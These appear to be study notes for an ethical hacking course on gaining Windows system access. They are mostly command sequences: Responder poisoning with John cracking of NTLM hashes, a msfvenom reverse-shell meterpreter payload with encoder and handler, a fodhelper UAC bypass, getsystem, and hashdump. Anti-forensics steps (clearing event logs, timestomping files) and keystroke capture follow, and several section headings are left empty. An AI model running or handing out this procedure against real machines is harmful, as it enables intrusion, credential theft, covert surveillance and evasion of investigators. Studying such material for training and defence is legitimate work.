# System Hacking

## Gain access to the system

### Crack the system’s password using Responder

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

```
cd Responder
chmod +x Responder.py
./Responder.py -I eth0
```
Goto windows machine
open run
type "\\CEH-Tools"
Go back to the linux machine

The logs are by default stored at ~/logs
```
sudo apt install john-the-ripper
sudo john ~/logs/SMB-NTLM
```
The password is now cracked!

### Audit system passwords using L0phtCrack
As an ethical hacker or penetration tester, you can use the L0phtCrack tool for auditing the system passwords of machines in the target network and later enhance network security by implementing a strong password policy for any systems with weak passwords.

* Windows
* Password Auditing Wizard button
* Follow set up steps
* Enter Admin credentials of the target machine

### Find vulnerabilities on exploit sites



### Exploit client-side vulnerabilities and establish a VNC session
### Gain access to a remote system using Armitage
### Hack a Windows machines with a malicious Office document using TheFatRat

## Privilege Escalation

### 1 Using BeRoot

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Exploit.exe 
```
```
msfconsole
use /exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhosts host
set lport port
exploit
```
Share this file over lan
After gaining access
```
getuid
```
ensure beroot is on desktop or location locally
```
upload pathofbeRoot.exe 
shell
beRoot.exe
exit
```
#### To check if privilege escalation is successful
```
run post/windows/gather/smart_hashdump
```
```
getsystem -t 1
```

```
background
```
### 2 Using bypassuac_fodhelper 

```
use exploit/windows/local/bypassuac_fodhelper
options
set session 1
set payload windows/meterpreter/reverse_tcp
set LHOST 
set target 0
exploit
```
If a meterpreter shell is opened, then the exploit is successful
```
getuid
getsystem -t 1 
getsystem
run post/windows/gather/smart_hashdump 
```
Clearing Logs (Requires admin access)
```
clearev 
```


While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.
```
timestomp secret.txt -v 
timestomp secret.txt -m “02/11/2018 08:10:03”
timestomp secret.txt -v
```
download command downloads a file from the remote machine to the host machine.
```
download file
```
search command that helps you to locate files on the target machine. This type of command is capable of searching through the whole system or can be limited to specific folders.
```
search -f fileextension
```
To capture all the keystrokes of target
```
keyscan_start 
keyscan_dump
```
To check idle time of the user
```
idletime
```
